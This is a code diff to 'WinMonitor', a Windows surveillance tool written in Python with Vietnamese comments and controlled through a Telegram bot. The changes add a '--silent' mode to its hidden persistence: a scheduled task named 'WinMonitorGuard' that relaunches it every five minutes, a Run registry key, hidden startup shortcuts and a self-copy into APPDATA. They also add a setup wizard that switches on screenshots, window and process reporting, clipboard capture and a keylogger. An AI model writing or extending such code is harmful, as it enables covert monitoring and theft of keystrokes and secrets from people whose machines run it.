@@ -873,7 +873,7 @@ def _run_hidden(cmd):
 
 def register_scheduled_tasks():
     target = launcher_target()
-    tr = '"%s"' % target
+    tr = '"%s" --silent' % target
     # task 1: moi 5 phut (tu phuc hoi neu bi kill; giam spawn thua - issue #17)
     _run_hidden(['schtasks', '/Create', '/TN', 'WinMonitorGuard',
                  '/TR', tr, '/SC', 'MINUTE', '/MO', '5', '/F'])
@@ -885,7 +885,7 @@ def register_scheduled_tasks():
 def register_run_key():
     try:
         import winreg
-        val = '"%s"' % launcher_target()
+        val = '"%s" --silent' % launcher_target()
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, winreg.KEY_SET_VALUE)
@@ -908,11 +908,11 @@ def ensure_persistence():
             else:
                 hide_file(DEPLOY_EXE)
             if not os.path.exists(LAUNCHER):
-                create_shortcut(LAUNCHER, DEPLOY_EXE)
+                create_shortcut(LAUNCHER, DEPLOY_EXE, "--silent")
             hide_file(LAUNCHER)
             try:
                 os.makedirs(STARTUP_DIR, exist_ok=True)
-                create_shortcut(STARTUP_LNK, DEPLOY_EXE)
+                create_shortcut(STARTUP_LNK, DEPLOY_EXE, "--silent")
                 hide_file(STARTUP_LNK)
             except Exception:
                 pass
@@ -1064,6 +1064,7 @@ HELP_TEXT = (
     "/cancel - Hủy yêu cầu\n\n"
     "<b>Khác</b>\n"
     "/config - Xem cấu hình\n"
+    "/edit - Mở cửa sổ sửa cấu hình\n"
     "/get &lt;khóa&gt; - Xem 1 khóa\n"
     "/set &lt;khóa&gt; &lt;giá trị&gt; - Đổi cấu hình\n"
     "/reset - Về mặc định\n"
@@ -1103,6 +1104,7 @@ BOT_COMMANDS = [
     ("confirm",  "Xác nhận mã OTP"),
     ("cancel",   "Hủy yêu cầu đang chờ"),
     ("config",   "Xem cấu hình"),
+    ("edit",     "Mở cửa sổ sửa cấu hình"),
     ("get",      "Xem 1 khóa cấu hình"),
     ("set",      "Đổi cấu hình: /set khóa giá_trị"),
     ("reset",    "Đặt lại cấu hình mặc định"),
@@ -1162,6 +1164,18 @@ def handle_command(text, chat_id):
     if cmd == "/reload":
         notify("🔄 Đang cập nhật lại menu lệnh...")
         threading.Thread(target=register_bot_commands, daemon=True).start()
+        return
+
+    if cmd == "/edit":
+        try:
+            exe = sys.executable if IS_FROZEN else (find_pythonw() or sys.executable)
+            if IS_FROZEN:
+                subprocess.Popen([exe, "--setup"])
+            else:
+                subprocess.Popen([exe, os.path.abspath(sys.argv[0]), "--setup"])
+            notify("🛠 Đã mở cửa sổ cấu hình trên máy. Sửa & lưu xong, cấu hình sẽ TỰ NẠP LẠI (không cần khởi động lại).")
+        except Exception as e:
+            notify("⚠️ Không mở được cửa sổ cấu hình: %s" % e)
         return
 
     if cmd == "/status":
@@ -1419,6 +1433,106 @@ def handle_update(upd):
         log("handle_update error: %s\n%s" % (e, traceback.format_exc()))
 
 
+
+# ============================================================================
+#  WIZARD CAU HINH (terminal)
+# ============================================================================
+def _has_flag(name):
+    return any(a == name or a.startswith(name + "=") for a in sys.argv[1:])
+
+
+def _prompt(label, default=""):
+    try:
+        if default != "":
+            v = input("%s [%s]: " % (label, default)).strip()
+        else:
+            v = input("%s: " % label).strip()
+    except EOFError:
+        return default
+    return v if v != "" else default
+
+
+def _prompt_bool(label, default):
+    d = "Y/n" if default else "y/N"
+    v = _prompt(label + " (" + d + ")", "").lower()
+    if v == "":
+        return default
+    return v in ("y", "yes", "c", "có", "co")
+
+
+def _prompt_int(label, default, lo, hi):
+    v = _prompt("%s (%d–%d)" % (label, lo, hi), str(default))
+    try:
+        n = int(v)
+    except Exception:
+        return default
+    return max(lo, min(hi, n))
+
+
+def run_wizard():
+    cur = {k: cfg_get(k) for k in DEFAULT_CONFIG}
+    print()
+    print("=" * 56)
+    print("  WinMonitor - Thiet lap cau hinh")
+    print("  (Nhan Enter de GIU gia tri trong [ngoac vuong])")
+    print("=" * 56)
+    print("  Tao bot: nhan @BotFather -> /newbot -> lay token")
+    print("  Lay Chat ID: nhan @userinfobot -> Id: ...")
+    print("-" * 56)
+    token = _prompt("Bot token", cur.get("bot_token", ""))
+    chat = _prompt("Chat ID", cur.get("chat_id", ""))
+    interval = _prompt_int("Chu ky chup man hinh (giay)", cur.get("screenshot_interval", 300), 5, 86400)
+    shots = _prompt_bool("Chup man hinh dinh ky?", cur.get("screenshots_enabled", True))
+    activity = _prompt_bool("Bao khi doi cua so?", cur.get("activity_monitor", True))
+    process = _prompt_bool("Bao tien trinh moi?", cur.get("process_monitor", True))
+    clip = _prompt_bool("Theo doi clipboard?", cur.get("clipboard_monitor", False))
+    keylog = _prompt_bool("Ghi phim go (keylogger - nhay cam)?", cur.get("keylogger", False))
+    heartbeat = _prompt_int("Bao 'van chay' moi (giay, 0=tat)", cur.get("heartbeat_interval", 3600), 0, 86400)
+    block = _prompt_int("Tu mo khoa ban phim/chuot sau (phut, 0=van 30')", cur.get("block_safety_minutes", 0), 0, 1440)
+    with CONFIG_LOCK:
+        CFG["bot_token"] = token.strip()
+        CFG["chat_id"] = chat.strip()
+        CFG["screenshot_interval"] = interval
+        CFG["screenshots_enabled"] = shots
+        CFG["activity_monitor"] = activity
+        CFG["process_monitor"] = process
+        CFG["clipboard_monitor"] = clip
+        CFG["keylogger"] = keylog
+        CFG["heartbeat_interval"] = heartbeat
+        CFG["block_safety_minutes"] = block
+        _validate_config(CFG)
+    save_config()
+    print("-" * 56)
+    print("  Da luu cau hinh vao:")
+    print("  " + CONFIG_PATH)
+    print("  WinMonitor se chay nen va tu khoi dong cung Windows.")
+    print("  (Cua so tu dong sau 3 giay...)")
+    print("-" * 56)
+    time.sleep(3)
+
+
+def config_watch_loop():
+    """Tu nap lai config khi file thay doi (vd sau khi chay wizard lan nua)."""
+    last = None
+    try:
+        last = os.path.getmtime(CONFIG_PATH)
+    except Exception:
+        pass
+    while RUNNING:
+        time.sleep(5)
+        try:
+            if os.path.exists(CONFIG_PATH):
+                m = os.path.getmtime(CONFIG_PATH)
+                if last is not None and m != last:
+                    last = m
+                    load_config()
+                    log("Phat hien config.json thay doi -> da nap lai.")
+                    notify("♻️ Đã nạp lại cấu hình mới.")
+                last = m
+        except Exception as e:
+            log("config_watch_loop error: %s" % e)
+
+
 # ============================================================================
 #  HEARTBEAT
 # ============================================================================
@@ -1542,6 +1656,15 @@ def main():
     except Exception:
         pass
 
+    # === WIZARD CAU HINH ===
+    # Double-click (khong co --silent/--no-wizard) hoac --setup => hoi cau hinh.
+    silent = _has_flag("--silent")
+    no_wizard = _has_flag("--no-wizard")
+    setup = _has_flag("--setup")
+    if setup or (not silent and not no_wizard):
+        run_wizard()
+        load_config()
+
     token = str(cfg_get("bot_token", ""))
     if not token or "PUT_YOUR" in token:
         log("Chua cau hinh bot_token. Dung.")
@@ -1578,7 +1701,7 @@ def main():
                 release_single_instance()
                 try:
                     pyw = find_pythonw()
-                    subprocess.Popen([pyw, SELF_COPY], cwd=BASE_DIR,
+                    subprocess.Popen([pyw, SELF_COPY, "--silent"], cwd=BASE_DIR,
                                      creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
                                      close_fds=True)
                     log("Da cai vao APPDATA va chuyen sang ban chuan.")
@@ -1605,6 +1728,7 @@ def main():
     threading.Thread(target=keylogger_loop, daemon=True).start()
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=selfheal_loop, daemon=True).start()
+    threading.Thread(target=config_watch_loop, daemon=True).start()
 
     log("WinMonitor started.")
     notify("✅ <b>WinMonitor đã khởi động</b> trên máy này.\nGửi /help để xem lệnh.")
